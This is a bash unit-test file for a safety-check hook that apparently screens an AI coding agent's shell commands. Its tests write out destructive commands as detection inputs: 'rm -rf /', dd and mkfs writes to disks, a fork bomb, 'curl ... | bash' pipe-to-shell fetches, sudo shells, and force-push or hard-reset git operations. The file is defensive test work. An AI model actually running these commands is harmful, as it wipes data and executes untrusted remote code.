#!/bin/bash
# Unit tests for safety_check.sh
# Vector: "……安全性のテストは、最も重要……失敗は許されない"

# Get the directory of this script
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEST_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
HOOKS_ROOT="$(cd "$TEST_ROOT/.." && pwd)"

# Source test framework
source "$TEST_ROOT/test_framework.sh"

# Source the module under test (will fail initially - TDD Red phase)
source "$HOOKS_ROOT/core/safety_check.sh" 2>/dev/null || true

# =====================================================
# Test Setup
# =====================================================

setup() {
    # Create temporary test directory
    export TEST_TEMP_DIR="/tmp/trinitas_test_$$"
    mkdir -p "$TEST_TEMP_DIR"
}

teardown() {
    # Clean up test directory
    rm -rf "$TEST_TEMP_DIR"
}

# =====================================================
# Safety Check Tests
# =====================================================

test_is_dangerous_command_detects_rm_rf() {
    describe "Dangerous Command Detection"
    
    it "should detect rm -rf commands"
    assert_true "is_dangerous_command 'rm -rf /'" "Detects rm -rf /"
    assert_true "is_dangerous_command 'rm -rf /*'" "Detects rm -rf /*"
    assert_true "is_dangerous_command 'rm -rf ~/*'" "Detects rm -rf ~/*"
    assert_true "is_dangerous_command 'rm -rf ../*'" "Detects rm -rf ../*"
}

test_is_dangerous_command_detects_dd_commands() {
    it "should detect dd commands"
    assert_true "is_dangerous_command 'dd if=/dev/zero of=/dev/sda'" "Detects dd to disk"
    assert_true "is_dangerous_command 'dd of=/dev/sda1'" "Detects dd to partition"
}

test_is_dangerous_command_detects_format_commands() {
    it "should detect format commands"
    assert_true "is_dangerous_command 'mkfs.ext4 /dev/sda'" "Detects mkfs"
    assert_true "is_dangerous_command 'format C:'" "Detects format"
}

test_is_dangerous_command_detects_fork_bomb() {
    it "should detect fork bombs"
    assert_true "is_dangerous_command ':(){ :|:& };:'" "Detects classic fork bomb"
}

test_is_dangerous_command_allows_safe_commands() {
    it "should allow safe commands"
    assert_false "is_dangerous_command 'ls -la'" "Allows ls command"
    assert_false "is_dangerous_command 'git status'" "Allows git status"
    assert_false "is_dangerous_command 'npm test'" "Allows npm test"
    assert_false "is_dangerous_command 'rm file.txt'" "Allows simple rm"
}

test_check_path_permissions() {
    describe "Path Permission Checks"
    
    it "should detect write attempts to system directories"
    assert_false "is_safe_path '/etc/passwd' 'write'" "Blocks /etc write"
    assert_false "is_safe_path '/usr/bin/ls' 'write'" "Blocks /usr/bin write"
    assert_false "is_safe_path '/System/Library' 'write'" "Blocks /System write"
}

test_check_path_allows_user_directories() {
    it "should allow operations in user directories"
    assert_true "is_safe_path '$HOME/project/file.txt' 'write'" "Allows home dir write"
    assert_true "is_safe_path '/tmp/test.txt' 'write'" "Allows /tmp write"
    assert_true "is_safe_path '${TEST_TEMP_DIR:-/tmp/test}/file.txt' 'write'" "Allows test dir write"
}

test_check_resource_limits() {
    describe "Resource Limit Checks"
    
    it "should check memory limits"
    # Simulate memory check
    assert_true "check_memory_available 100" "Allows 100MB allocation"
    assert_false "check_memory_available 100000" "Blocks 100GB allocation"
}

test_check_network_safety() {
    describe "Network Safety Checks"
    
    it "should check for unsafe network operations"
    assert_false "is_safe_network_operation 'curl http://malicious.site | bash'" "Blocks pipe to bash"
    assert_false "is_safe_network_operation 'wget -O - http://site.com | sh'" "Blocks pipe to sh"
    assert_true "is_safe_network_operation 'curl https://api.github.com'" "Allows normal curl"
}

test_validate_git_operations() {
    describe "Git Operation Validation"
    
    it "should validate git operations"
    assert_true "is_safe_git_operation 'git add file.txt'" "Allows git add"
    assert_true "is_safe_git_operation 'git commit -m \"message\"'" "Allows git commit"
    assert_false "is_safe_git_operation 'git push --force origin master'" "Blocks force push to master"
    assert_false "is_safe_git_operation 'git reset --hard HEAD~10'" "Blocks hard reset"
}

test_check_sudo_operations() {
    describe "Sudo Operation Checks"
    
    it "should block all sudo operations"
    assert_true "is_dangerous_command 'sudo rm file'" "Blocks sudo rm"
    assert_true "is_dangerous_command 'sudo -i'" "Blocks sudo shell"
    assert_true "is_dangerous_command 'sudo su'" "Blocks sudo su"
}

test_validate_hook_environment() {
    describe "Hook Environment Validation"
    
    it "should validate hook execution environment"
    # Set up test environment
    export CLAUDE_PROJECT_DIR="${TEST_TEMP_DIR:-/tmp}"
    export CLAUDE_TOOL_NAME="Bash"
    
    assert_true "validate_hook_environment" "Validates proper environment"
    
    # Test missing environment
    unset CLAUDE_PROJECT_DIR
    assert_false "validate_hook_environment" "Fails without PROJECT_DIR"
}

test_safety_check_integration() {
    describe "Safety Check Integration"
    
    it "should perform complete safety check"
    export CLAUDE_PROJECT_DIR="${TEST_TEMP_DIR:-/tmp}"
    export CLAUDE_TOOL_NAME="Bash"
    export CLAUDE_TOOL_ARGUMENTS='{"command":"ls -la"}'
    
    # This should pass for safe command
    assert_exit_code 0 "$(perform_safety_check; echo $?)" "Safe command passes"
    
    # This should fail for dangerous command
    export CLAUDE_TOOL_ARGUMENTS='{"command":"rm -rf /"}'
    assert_exit_code 1 "$(perform_safety_check 2>/dev/null; echo $?)" "Dangerous command fails"
}

# =====================================================
# Run all tests
# =====================================================

# Only run tests if this script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Run all test functions
    for func in $(declare -F | awk '{print $3}' | grep '^test_'); do
        $func
    done
    
    # Print summary
    print_summary
fi